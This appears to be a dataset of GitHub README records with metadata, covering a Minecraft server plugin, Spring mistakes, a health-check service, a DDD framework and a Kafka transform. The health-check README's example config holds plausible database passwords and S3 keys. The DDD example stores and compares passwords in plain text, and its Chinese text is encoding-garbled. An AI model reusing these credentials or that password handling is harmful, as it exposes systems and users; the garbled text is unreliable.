- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

â€» `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
â€» Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).
- If you want your PowerController to be added to BungeePteroPower, please send a pull request.

### Building

Pull requests are welcome for BungeePteroPower.  
You can build it using the following steps:

```bash
git clone https://github.com/Kamesuta/BungeePteroPower.git
cd BungeePteroPower
mvn install
```
- This plugin needs to be built with Java 11 or higher.
- After building, a `BungeePteroPower-<version>.jar` file will be generated in the `target` directory.

## About Statistics Data

BungeePteroPower collects anonymous statistical data using [bStats](https://bstats.org/).  
You can find the statistics data [here](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917).

bStats is used to understand the usage of the plugin and help improve it.  
To disable the collection of statistical data, please set `enabled` to `false` in `plugins/bStats/config.yml`
",9,2,3,8.0,"['bungeepteropower', 'key', 'feature', 'download', 'requirement', 'get', 'start', 'pterodactyl', 'configuration', 'the', 'url', 'pterodactyl', 'panel', 'if', 'use', 'cloudflare', 'tunnel', 'need', 'allow', 'ip', 'bypass', 'setting', 'the', 'client', 'api', 'key', 'pterodactyl', 'panel', 'it', 'start', 'you', 'find', 'client', 'api', 'key', 'api', 'credential', 'tab', 'account', 'page', 'per', 'server', 'configuration', 'pterodactyl', 'server', 'id', 'you', 'find', 'pterodactyl', 'server', 'id', 'url', 'server', 'page', 'for', 'example', 'url', 'http', 'server', 'id', 'the', 'time', 'second', 'stop', 'server', 'last', 'player', 'leaf', 'if', 'want', 'stop', 'server', 'automatically', 'set', 'if', 'set', 'server', 'stop', 'immediately', 'last', 'player', 'leaf', 'the', 'player', 'start', 'server', 'the', 'player', 'start', 'specific', 'server', 'all', 'player', 'start', 'server', 'all', 'player', 'start', 'server', 'all', 'player', 'start', 'specific', 'server', 'usage', 'automatic', 'startup', 'manual', 'reload', 'file', 'configuration', 'require', 'setting', 'optional', 'setting', 'permission', 'setting', 'about', 'language', 'file', 'information', 'plugin', 'developer', 'about', 'power', 'controller', 'create', 'building', 'about', 'statistic', 'data']","['server', 'start', 'player', 'pterodactyl', 'the']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
danvega/spring-common-mistakes,main,"# Spring Developer Common Mistakes

This is a repository of common mistakes we make as Spring Developers. 

[First 5 Common Mistakes](https://www.youtube.com/@danvega)

We did an episode based on this on The Spring Office Hours Podcast: 

[Spring Office Hours S3E4 - Common Spring Developer Mistakes](https://www.youtube.com/watch?v=nd5JzDIEI6A)

## 1. Making Everything Public 

When you get dropped into a Spring Boot project you have free rein to organize your project however you want. This is great because it allows you to put your code wherever you want. However, a lot of us (me included) follow a convention where we use a package by layer architecture. This causes code that is closely related to be split into different packages and therefore having to make everything public which is not how we would typically write code.

[Package by Layer vs Package by Feature](https://youtu.be/B1d95I7-zsw)

## 2 Field Injection

A common mistake is choosing field injection for Dependency Injection. There are a number of reasons that you should
favor constructor injection over field injection.

[Spring Constructor Injection: Why is it the recommended approach to Dependency Injection?](https://youtu.be/aX-bgylmprA)

## 3. Interface and Implementation when not necessary

There is a right place and a right time to create interfaces but in this common mistake we take a look at a time where it doesn't make a lot of sense. 

## 4. Proper REST API Design

Spring Boot gives you the tools to quickly and easily stand up a REST API. A common mistake I often see is creating REST resources with improper URIs. When you create a REST resource the request method should describe the intention, not the URI.

## 5. Improper Exception Handling

When a user expects a response and none is given that isn't a good experience. It's better to return something and in the case of asking for a resource by an invalid id it's often good practice to handle that exception. ",0,1,11,0.0,"['spring', 'developer', 'common', 'mistake', 'make', 'everything', 'public', 'field', 'injection', 'interface', 'implementation', 'necessary', 'proper', 'rest', 'api', 'design', 'improper', 'exception', 'handling']","['spring', 'developer', 'common', 'mistake', 'make']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
renmeijian/HealthChecker,master,"> English | [ä¸­æ–‡](README-zh-CN.md)
# Introduction

## What can HealthChecker doï¼Ÿ

It can check the health status of all instances of all services in the cluster, as well as the health status of dependencies such as MySql, Redis, OSS, ETCD, etc., for easy scalability.


**Background** 

1. During the operation of services and components, unavailability failures are inevitable. In addition to ensuring high availability, timely warning and recovery of failures are also necessary to avoid causing global unavailability.

2. The health check component only needs to add an active health check component client dependency to the service to be checked to achieve the health check and alarm functions of the service.

3. For components such as databases, simple configuration is required to achieve second level perception of middleware failures, rather than waiting for customer feedback, improving fault handling speed and customer satisfaction with the product.

The active health check and alarm component is divided into three parts, namely **client, server, and alarm service**.

This repository contains all the code for the client and server, excluding alarm services. Due to the different alarm requirements of different businesses, you can develop your own alarm services according to your own business needs, store the inspection results, and then formulate corresponding alarm rules and channels.

## Type of Check

**Passive health check**ï¼šSpringBoot

**Proactive health check**ï¼šMysqlã€redisã€etcdã€oss

## Overall process

![eb7aa8eecb0c293dc32cbed579f20e10](https://github.com/renmeijian/HealthChecker/assets/50255831/1ba04ae2-7f95-4269-a44a-29d93ba9a2fe)



## Overall Code Introduction

To be supplemented.......

Service Information Storage Structureï¼š

```java
    /**
     * namespace,  serviceName : set<instance>
     */
    public final Map<String, Map<String, Service>> serviceMap = new ConcurrentHashMap<>();
```




# Component characteristics and implementation

## Be capable

Can check the health status of all instances of all services in the cluster, as well as the health status of dependencies such as MySql, Redis, OSS, ETCD, etc

## Easy to integrate

This component is easy to integrate into the Spring Boot project with minimal code intrusion.

### For microservice health check: only two steps needed

#### aã€ Introducing client dependencies in the project of health check planning

```xml
        <dependency>
            <groupId>rpa</groupId>
            <artifactId>health-client</artifactId>
            <version>0.0.1</version>
        </dependency>
```


#### bã€Add application.yml configuration to the project for health check

Configuration example:

```yml
# HealthChecker Server deployment address
health-server:
  info:
    ip: 127.0.0.1
    port: 9001
    namespace: dev
```


### For middleware health checks such as MySql

#### aã€Enable the health check function of the corresponding middleware in the health server, where enableCheck is true to indicate that the health check function of the middleware is enabled. Then configure the middleware connection information.

```yml
server:
  port: 9001
spring:
  application:
    name: health-server

health:
  mysql:
    enableCheck: false  # Is MySQL health check enabled? True enabled, false disabled
    ip: 172.30.92.11  # MySQL access address
    port: 3306 # MySQL access port
    database: rpa # MySQL database name
    user: root
    pwd: '*&T3*1(%imk@VB'
  redis:
    enableCheck: false # Is Redis health check enabled? True enabled, false disabled
    ip: 172.30.92.11
    port: 6379
    pwd: ""&r6Fe$^7%NBm""
  s3:
    enableCheck: false # Is S3 health check enabled? True enabled, false disabled
    ip: ""172.30.92.11:9000""
    bucketName: rpa
    prefix: resource/
    secretKey: ""dyAwnn1eGIlxEepisVQAjHm6qzxXbF3x""
    accessKey: ""grMSBA3SXispbLaB""
  etcd:
    enableCheck: false # Is the ETCD health check enabled? True enabled, false disabled
    ip: 172.30.92.11
    port: 22379
```


#### bã€If there are other middleware that require health checks, this component supports extension. The extension steps are as followsï¼š

##### Create configuration mapping class

For Redis configuration: add necessary annotations, set type values (such as Redis), and add connection information fields, as shown in the following figure:
    
![image](https://github.com/renmeijian/HealthChecker/assets/50255831/457799e6-65d4-4a66-9e3a-1f86a2aadd3b)

##### Write the corresponding health check processor

Add @ HealthChecker annotation and set the type value. Implement the HealthCheckProcessor interface and start a thread for health checks, as shown in the following figure:
    
![image](https://github.com/renmeijian/HealthChecker/assets/50255831/d3e5d91d-b49a-446f-857b-21f563a1ea8d)

    

## High-performance

**Asynchronous**

Blocking queue

Put the task of service registration into a blocking queue and use thread pool stepping to complete instance updates, thereby improving concurrent writing capabilities.

**Thread pool**

 Timed threads can be reused

**Connection pool**

 Database check connection reusability

**Double-Checked Lock**  
 
 Ensure that there is only one instance in the application

## Low Coupling

**Observer mode**

Minimize dependencies as much as possible, making them easier to maintain and with low coupling

## Functional Cohesion

Registration processing, heartbeat processing, sending HTTP requests, and other functions are separately packaged into classes

## Strong scalability

**Strategy mode**

Select the corresponding HealthCheckProcessor instance based on the type of task for processing, and delegate the specific processing logic to the corresponding processor


# Other technical points

**synchronized**

Lock the action of modifying the service list to avoid security issues of concurrent modifications


**Double-Checked Lock**

Ensure thread safety and reduce synchronization overhead

**CopyOnWrite**

In the addIPAddress method, the old instance list will be copied and a new instance will be added to the list. After updating the instance status, the old instance list will be directly overwritten with the new list. During the update process, the old instance list is not affected and can still be read while processing heartbeats and determining health status.



# The next step

Health server is highly available, enabling multi instance deployment and data synchronization between nodes
",0,0,1,1.0,"['introduction', 'what', 'healthchecker', 'type', 'check', 'overall', 'process', 'overall', 'code', 'introduction', 'component', 'characteristic', 'implementation', 'be', 'capable', 'easy', 'integrate', 'for', 'microservice', 'health', 'check', 'two', 'step', 'need', 'introducing', 'client', 'dependency', 'project', 'health', 'check', 'planning', 'configuration', 'project', 'health', 'check', 'healthchecker', 'server', 'deployment', 'address', 'for', 'middleware', 'health', 'check', 'mysql', 'health', 'check', 'function', 'correspond', 'middleware', 'health', 'server', 'enablecheck', 'true', 'indicate', 'health', 'check', 'function', 'middleware', 'enable', 'then', 'configure', 'middleware', 'connection', 'information', 'be', 'mysql', 'health', 'check', 'enable', 'true', 'enable', 'false', 'disable', 'mysql', 'access', 'address', 'mysql', 'access', 'port', 'mysql', 'database', 'name', 'be', 'redis', 'health', 'check', 'enable', 'true', 'enable', 'false', 'disable', 'be', 'health', 'check', 'enable', 'true', 'enable', 'false', 'disable', 'be', 'etcd', 'health', 'check', 'enable', 'true', 'enable', 'false', 'disable', 'middleware', 'require', 'health', 'check', 'component', 'support', 'extension', 'the', 'extension', 'step', 'create', 'configuration', 'map', 'class', 'write', 'correspond', 'health', 'check', 'processor', 'low', 'couple', 'functional', 'cohesion', 'strong', 'scalability', 'other', 'technical', 'point', 'the', 'next', 'step']","['check', 'health', 'enable', 'be', 'middleware']",2.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,2.0,0.0
chensheng/ddd-boot,master,"# DDD-BOOT
DDD (Domain-Driven Design) é¢†åŸŸé©±åŠ¨è®¾è®¡å·¥ç¨‹åŒ–è½åœ°æ¡†æ¶

* [å¿«é€Ÿå¼€å§‹](#å¿«é€Ÿå¼€å§‹)
* [æ¶æ„è¯´æ˜](#æ¶æ„è¯´æ˜)
* [é€šç”¨ç»„ä»¶](#é€šç”¨ç»„ä»¶)
* [ç¤ºä¾‹è®²è§£](#ç¤ºä¾‹è®²è§£)

## å¿«é€Ÿå¼€å§‹

### åˆ›å»ºé¡¹ç›®
```shell
mvn archetype:generate \
 -DgroupId=org.example \
 -DartifactId=ddd-example \
 -Dversion=1.0.0-SNAPSHOT \
 -Dpackage=org.example.ddd \
 -DarchetypeGroupId=io.github.chensheng \ 
 -DarchetypeArtifactId=ddd-microservice-archetype \ 
 -DarchetypeVersion=1.0.0-SNAPSHOT
```

### è¿è¡Œé¡¹ç›®
```shell
mvn spring-boot:run
```

## æ¶æ„è¯´æ˜

### æ¦‚è¿°
![æ¶æ„å›¾](docs/æ¶æ„å›¾.jpg)

æ¡†æ¶é‡‡ç”¨4å±‚æ¶æ„ï¼Œåˆ†åˆ«ä¸ºæ¥å£å±‚ã€åº”ç”¨å±‚ã€é¢†åŸŸå±‚ã€åŸºç¡€è®¾æ–½å±‚ã€‚

### åˆ†å±‚è¯´æ˜

#### æ¥å£å±‚
å¯¹å¤–æä¾›RESTæ¥å£ï¼ŒæŒ‰è°ƒç”¨æ–¹çš„ä¸åŒè¿›è¡Œåˆ†åŒ…ã€‚

#### åº”ç”¨å±‚
è´Ÿè´£ä¸šåŠ¡é€»è¾‘çš„ç¼–æ’ï¼Œä¸è´Ÿè´£å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚

`åº”ç”¨æœåŠ¡`
å¯¹åº”åˆ°ä¸€ä¸ªå…·ä½“çš„ä¸šåŠ¡åœºæ™¯ï¼Œé€šè¿‡ç¼–æ’å®ä½“ã€èšåˆã€ä»“å‚¨ã€é¢†åŸŸæœåŠ¡æ¥å®Œæˆã€‚
æŒ‰ç…§CQRS(å‘½ä»¤æŸ¥è¯¢èŒè´£åˆ†ç¦»)æ¨¡å¼å°†åº”ç”¨æœåŠ¡åˆ†ä¸ºCommandServiceå’ŒQueryServiceã€‚
CommandServiceå®Œæˆä¼šæ”¹å˜ç³»ç»ŸçŠ¶æ€çš„ä¸šåŠ¡åœºæ™¯ï¼ˆå†™æ“ä½œï¼‰ï¼Œåªèƒ½ä¾èµ–äºé¢†åŸŸå±‚ã€‚
QueryServiceå®ŒæˆæŸ¥è¯¢æ•°æ®çš„ä¸šåŠ¡åœºæ™¯ï¼ˆè¯»æ“ä½œï¼‰ï¼Œå¯ç©¿é€é¢†åŸŸå±‚ï¼Œç›´æ¥è°ƒç”¨åŸºç¡€è®¾æ–½å±‚çš„æ•°æ®åº“æŸ¥è¯¢æ–¹æ³•ã€‚

`DTO`
åˆ†ä¸ºCommandã€Queryã€Resultä¸‰ç±»ã€‚Commandå’ŒQueryä¸ºåº”ç”¨æœåŠ¡çš„å…¥å‚ï¼ŒResultä¸ºåº”ç”¨æœåŠ¡çš„è¿”å›ç»“æœã€‚
Commandä¸ºCommandServiceçš„å…¥å‚ã€‚Queryä¸ºQueryServiceçš„å…¥å‚ã€‚

#### é¢†åŸŸå±‚
æ ¸å¿ƒå±‚ï¼Œå®Œå…¨ç‹¬ç«‹ï¼Œä¸ä¾èµ–å…¶ä»–å±‚ã€‚è¯¥å±‚æ²‰æ·€äº†æ•´ä¸ªä¸šåŠ¡åŸŸä¸­çš„ä¸šåŠ¡é¢†åŸŸæ¨¡å‹ï¼Œæ ¸å¿ƒçš„ä¸šåŠ¡é€»è¾‘éƒ½åœ¨è¿™å±‚ã€‚

`å®ä½“`
ä¸šåŠ¡å¯¹è±¡ï¼Œå…·æœ‰ä¸šåŠ¡å±æ€§å’Œä¸šåŠ¡è¡Œä¸ºã€‚

`å€¼å¯¹è±¡`
ç›¸å…³å±æ€§çš„é›†åˆï¼Œå¯¹å®ä½“çš„çŠ¶æ€ã€ç‰¹å¾è¿›è¡Œä¸šåŠ¡è¯­ä¹‰çš„æè¿°ã€‚

`èšåˆ`
ç”±ä¸šåŠ¡é€»è¾‘ç´§å¯†å…³è”çš„å®ä½“ç»„æˆçš„ã€‚

`é¢†åŸŸæœåŠ¡`
å½“ä¸šåŠ¡é€»è¾‘ä¸å±äºä»»ä½•å®ä½“å’Œèšåˆæ—¶ï¼Œå¯å°†å…¶æ”¾åœ¨é¢†åŸŸæœåŠ¡ä¸­ã€‚è®¾è®¡é¢†åŸŸæœåŠ¡çš„ä¸€ä¸ªåŸåˆ™æ˜¯ï¼šå¦‚æ— å¿…è¦ï¼Œå‹¿å†™é¢†åŸŸæœåŠ¡ã€‚

`ä»“å‚¨`
å¯¹èµ„æºè®¿é—®çš„æŠ½è±¡ï¼ŒåŒ…æ‹¬æ•°æ®åº“ã€æ–‡ä»¶ã€å¾®æœåŠ¡ã€å¤–éƒ¨ç³»ç»Ÿç­‰èµ„æºã€‚é¢†åŸŸå±‚åªå®šä¹‰ä»“å‚¨çš„æ¥å£ï¼Œå…·ä½“å®ç°åœ¨åŸºç¡€è®¾æ–½å±‚å®Œæˆã€‚

#### åŸºç¡€è®¾æ–½å±‚
è´Ÿè´£ä¸å…¶ä»–å¾®æœåŠ¡ã€å¤–éƒ¨ç³»ç»Ÿã€æ•°æ®åº“åŠRedisç­‰å…¶ä»–ä¸­é—´ä»¶çš„äº¤äº’ã€‚

`é¡¹ç›®é…ç½®`
é¡¹ç›®å·¥ç¨‹ä¸æŠ€æœ¯ç›¸å…³çš„é…ç½®ï¼Œæ¯”å¦‚æ‹¦æˆªå™¨ã€MyBatisã€Redisç­‰é…ç½®ã€‚

`ä»“å‚¨å®ç°`
æ ¹æ®é¢†åŸŸå±‚å®šä¹‰çš„ä»“å‚¨æ¥å£ï¼Œå®ç°ä»“å‚¨çš„å…·ä½“åŠŸèƒ½ã€‚

`å¯¹è±¡è½¬æ¢å™¨`
ä½¿ç”¨[MapStruct](https://mapstruct.org)å®Œæˆå„å±‚å¯¹è±¡çš„è½¬æ¢ï¼ŒåŒ…æ‹¬DTOã€å®ä½“ã€èšåˆã€å€¼å¯¹è±¡ã€POç­‰å¯¹è±¡ã€‚
```java
@Mapper(componentModel = MappingConstants.ComponentModel.SPRING)
public interface ExampleConvertor {
    Example toExamplePo(ExampleEntity entity);
}
```

### æ¶æ„æ ¡éªŒ
é€šè¿‡æµ‹è¯•ç”¨ä¾‹æ ¡éªŒä»£ç æ˜¯å¦ç¬¦åˆDDDè§„èŒƒï¼Œé˜²æ­¢å¼€å‘è€…å†™ä»£ç æ—¶å†²ç ´æ¶æ„ã€‚
```java
public class DDDArchitectureTest {
    @Test
    public void testDDDArchitecture() {
        ArchitectureTest.validateDDD(""org.example"");
    }
}
```

## é€šç”¨ç»„ä»¶
[é€šç”¨ç»„ä»¶ä»‹ç»](/ddd-boot/README.md)


## ç¤ºä¾‹è®²è§£
[ç¤ºä¾‹ä»£ç ](/ddd-archetypes/ddd-microservice)

é’ˆå¯¹ç®€å•çš„å¢åˆ æ”¹æŸ¥ä¸šåŠ¡ï¼Œé€šè¿‡ç»§æ‰¿ã€å®ç°é€šç”¨çš„`Entity` `DataObject` `Result` `Repository` `Convertor` `Mapper`ï¼Œé¿å…ç¼–å†™é‡å¤çš„ä»£ç ã€‚

### åˆ›å»ºé¢†åŸŸæ¨¡å‹
å®ç°`DDDEntity`ï¼Œè¡¥å……é¢†åŸŸå±æ€§ã€é¢†åŸŸè¡Œä¸ºã€‚
```java
@Getter
@Builder
public class ExampleEntity implements DDDEntity {
    /*============= é¢†åŸŸå±æ€§ start ================*/
    private Long id;

    private String username;

    private String password;

    private ExampleStatus status;
    /*============= é¢†åŸŸå±æ€§ end ================*/

    
    /*============= é¢†åŸŸè¡Œä¸º start ================*/
    /**
     * æ–°å»ºç”¨æˆ·
     * @param username ç”¨æˆ·åï¼›å¿…ä¼ 
     * @param password å¯†ç ï¼›å¿…ä¼ 
     * @return
     */
    public static ExampleEntity create(String username, String password) {
        if(TextUtil.isBlank(username)) {
            throw new BizException(""ç”¨æˆ·åä¸èƒ½ä¸ºç©º"");
        }
        if(TextUtil.isCNWord(username)) {
            throw new BizException(""ç”¨æˆ·åä¸èƒ½åŒ…å«ä¸­æ–‡"");
        }
        if(TextUtil.isBlank(password)) {
            throw new BizException(""å¯†ç ä¸èƒ½ä¸ºç©º"");
        }
        if(password.length() < 6) {
            throw new BizException(""å¯†ç ä¸èƒ½å°‘äº6ä½æ•°"");
        }

        ExampleEntity user = builder()
                .username(username)
                .password(password)
                .status(ExampleStatus.ENABLE)
                .build();
        user.checkPasswordFormat();
        return user;
    }

    /**
     * ä¿®æ”¹å¯†ç 
     * @param oldPassword åŸå¯†ç ï¼›å¿…ä¼ 
     * @param newPassword æ–°å¯†ç ï¼›å¿…ä¼ 
     */
    public void updatePassword(String oldPassword, String newPassword) {
        if(TextUtil.isBlank(oldPassword)) {
            throw new BizException(""åŸå¯†ç ä¸èƒ½ä¸ºç©º"");
        }
        if(TextUtil.isBlank(newPassword)) {
            throw new BizException(""æ–°å¯†ç ä¸èƒ½ä¸ºç©º"");
        }
        if(newPassword.length() < 6) {
            throw new BizException(""å¯†ç ä¸èƒ½å°‘äº6ä½æ•°"");
        }
        if(!this.password.equals(oldPassword)) {
            throw new BizException(""åŸå¯†ç é”™è¯¯"");
        }
        if(oldPassword.equals(newPassword)) {
            throw new BizException(""æ–°å¯†ç ä¸èƒ½ä¸æ—§å¯†ç ç›¸åŒ"");
        }

        this.password = newPassword;
        this.checkPasswordFormat();
    }

    /**
     * å¯ç”¨ç”¨æˆ·
     */
    public void enable() {
        if(this.status == ExampleStatus.ENABLE) {
            throw new BizException(""ç”¨æˆ·å·²æ˜¯å¯ç”¨çŠ¶æ€"");
        }

        this.status = ExampleStatus.ENABLE;
    }

    /**
     * åœç”¨ç”¨æˆ·
     */
    public void disable() {
        if(this.status == ExampleStatus.DISABLE) {
            throw new BizException(""ç”¨æˆ·å·²æ˜¯ç¦ç”¨çŠ¶æ€"");
        }

        this.status = ExampleStatus.DISABLE;
    }
    /*============= é¢†åŸŸè¡Œä¸º end ================*/

    private void checkPasswordFormat() {
        String passwordFormat = ""^(?![A-Za-z0-9]+$)(?![a-z0-9\\W]+$)(?![A-Za-z\\W]+$)(?![A-Z0-9\\W]+$)[a-zA-Z0-9\\W]{8,}$"";
        if(TextUtil.isBlank(password) || !password.matches(passwordFormat)) {
            throw new BizException(""å¯†ç å¿…é¡»ç”±æ•°å­—ã€å­—æ¯ã€ç‰¹æ®Šå­—ç¬¦_#@!ç»„æˆï¼Œä¸”ä¸èƒ½å°‘äº8ä½ï¼"");
        }
    }
}
```

### åˆ›å»ºResultå¯¹è±¡
APIçš„è¿”å›ç»“æœ
```java
@Data
public class ExampleResult {
    private Long id;

    private String username;
}
```

### åˆ›å»ºæ•°æ®å¯¹è±¡åŠMapper
ç»§æ‰¿`DataObject`, æˆ–å®ç°`IDataObject`
```java
@Data
public class Example extends DataObject {
    private String username;

    private String password;

    private ExampleStatus status;
}
```

ç»§æ‰¿`BaseMapper`
```java
public interface ExampleMapper extends BaseMapper<Example> {
}
```

### åˆ›å»ºä»“å‚¨
ç»§æ‰¿`DDDRepository`
```java
public interface ExampleRepository extends DDDRepository<ExampleEntity> {
}
```

ç»§æ‰¿`DDDRepositoryImpl`
```java
@Component
public class ExampleRepositoryImpl extends DDDRepositoryImpl<ExampleEntity, Example, ExampleConvertor, ExampleMapper> implements ExampleRepository {
}
```

### æŸ¥è¯¢åŠŸèƒ½

#### QueryService
ç»§æ‰¿`DDDQueryService`
```java
public interface ExampleQueryService extends DDDQueryService<ExampleResult> {
}
```

ç»§æ‰¿`DDDQueryServiceImpl`
```java
@Service
public class ExampleQueryServiceImpl extends DDDQueryServiceImpl<ExampleEntity, Example, ExampleResult, ExampleConvertor, ExampleMapper> implements ExampleQueryService {
}
```

#### Query
åˆ›å»ºåˆ†é¡µæŸ¥è¯¢Queryï¼Œ ç»§æ‰¿`PageQuery`
```java
@Data
public class ExamplePageQuery extends PageQuery {
    @QuerySortable
    private String username;

    @QueryCondition(column = ""username"", operator = ConditionOperator.like)
    private String usernameLike;

    @QuerySortable(order = OrderType.DESC)
    private ExampleStatus status;

    @Override
    protected Long getMaxSize() {
        return 20l;
    }
}
```

åˆ›å»ºåˆ—è¡¨æŸ¥è¯¢Queryï¼Œç»§æ‰¿`ListQuery`
```java
@Data
public class ExampleListQuery extends ListQuery {
    @QuerySortable
    private String username;

    @QueryCondition(column = ""username"", operator = ConditionOperator.like)
    private String usernameLike;

    @QuerySortable(order = OrderType.DESC)
    private ExampleStatus status;

    @Override
    protected Long getMaxLimit() {
        return 10l;
    }
}
```

#### API
```java
@RestController
@RequestMapping(""/web/example"")
public class ExampleController {
    @Autowired
    private ExampleQueryService exampleQueryService;

    @GetMapping(""/page"")
    public Page<ExampleResult> page(@Valid ExamplePageQuery query) {
        return exampleQueryService.page(query);
    }

    @GetMapping(""/list"")
    public List<ExampleResult> list(@Valid ExampleListQuery query) {
        return exampleQueryService.list(query);
    }

    @GetMapping(""/{id}"")
    public ExampleResult detail(@PathVariable Long id) {
        return exampleQueryService.detail(id);
    }
}
```

### å¢åˆ æ”¹åŠŸèƒ½

#### Command
```java
@Data
public class ExampleCreateCommand {
    @NotEmpty(message = ""è¯·è¾“å…¥ç”¨æˆ·å"")
    private String username;

    @NotEmpty(message = ""è¯·è¾“å…¥å¯†ç "")
    private String password;
}
```

```java
@Data
public class ExampleUpdatePasswordCommand {
    @NotEmpty(message = ""è¯·è¾“å…¥æ—§å¯†ç "")
    private String oldPassword;

    @NotEmpty(message = ""è¯·è¾“å…¥æ–°å¯†ç "")
    private String newPassword;
}
```

#### CommandService
```java
public interface ExampleCommandService {
    void create(ExampleCreateCommand command);

    void update(ExampleUpdatePasswordCommand command);

    void enable(Long id);

    void disable(Long id);

    void delete(Long id);
}
```

```java
@Service
@Transactional
public class ExampleCommandServiceImpl implements ExampleCommandService {
    @Autowired
    private ExampleRepository exampleRepository;

    @Override
    public void create(ExampleCreateCommand command) {
        ExampleEntity entity = ExampleEntity.create(command.getUsername(), command.getPassword());
        exampleRepository.save(entity);
    }

    @Override
    public void update(ExampleUpdatePasswordCommand command) {
        Long userId = securityRepository.getLoginUser();
        ExampleEntity entity = exampleRepository.getById(userId);
        entity.updatePassword(command.getOldPassword(), command.getNewPassword());
        exampleRepository.save(entity);
    }

    @Override
    public void enable(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        entity.enable();
        exampleRepository.save(entity);
    }

    @Override
    public void disable(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        entity.disable();
        exampleRepository.save(entity);
    }

    @Override
    public void delete(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        exampleRepository.remove(entity);
    }
}
```

#### API
```java
@RestController
@RequestMapping(""/web/example"")
public class ExampleController {
    @Autowired
    private ExampleCommandService exampleCommandService;
    
    @PostMapping
    public void create(@Valid @RequestBody ExampleCreateCommand command) {
        exampleCommandService.create(command);
    }

    @PutMapping(""/password"")
    public void updatePassword(@Valid @RequestBody ExampleUpdatePasswordCommand command) {
        exampleCommandService.update(command);
    }

    @PutMapping(""/{id}/enabled"")
    public void enable(@PathVariable Long id) {
        exampleCommandService.enable(id);
    }

    @PutMapping(""/{id}/disabled"")
    public void disable(@PathVariable Long id) {
        exampleCommandService.disable(id);
    }

    @DeleteMapping(""/{id}"")
    public void delete(@PathVariable Long id) {
        exampleCommandService.delete(id);
    }
}
```




",0,0,1,0.0,"['queryservice', 'query', 'api', 'command', 'commandservice', 'api']","['api', 'queryservice', 'query', 'command', 'commandservice']",17.0,"[maven-archetype-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,12.0,4.0
EladLeev/KeyToField-smt,main,"# KeyToField - SMT for Kafka Connect / Debezium
A Kafka Connect SMT that allows you to add the record key to the value as a named field.

## Overview
The `KeyToField` transformation is designed to enhance Kafka Connect functionality by including the record key as a field within the record's value. This can be particularly useful in scenarios where downstream systems require access to the original key alongside the record data.

> This SMT was featured on [Confluent's Newsletter](https://developer.confluent.io/newsletter/you-put-what-in-your-events/#:~:text=A%20single%20message%20key%20to%20field%20transform%20for%20Kafka%20Connect/Debezium%20by%20Elad%20Leev!%20In%20a%20way%20it%E2%80%99s%20the%20reverse%20of%20the%20ValueToKey%20SMT%20that%20comes%20with%20Kafka%20Connect%2C%20useful%20for%20when%20the%20fields%20in%20the%20key%20are%20not%20included%20in%20the%20value.)! ğŸš€

## Features
* Add the record key to the value as a named field.
* Customizable field name and delimiter.

## Installation
1. Use the latest release on GitHub, or build the JAR file from source using Maven:
```bash
mvn clean package
```
2. Copy the generated JAR file (`keytofield-transform-<version>.jar`) to the Kafka Connect plugins directory.
3. Restart Kafka Connect for the reload the plugin directory.
4. Update your connector with the SMT configuration

## Configuration
The KeyToField transformation can be configured with the following properties:

* `field.name`: Name of the field to insert the Kafka key to (default: `kafkaKey`).
* `field.delimiter`: Delimiter to use when concatenating the key fields (default: `-`).

## Usage
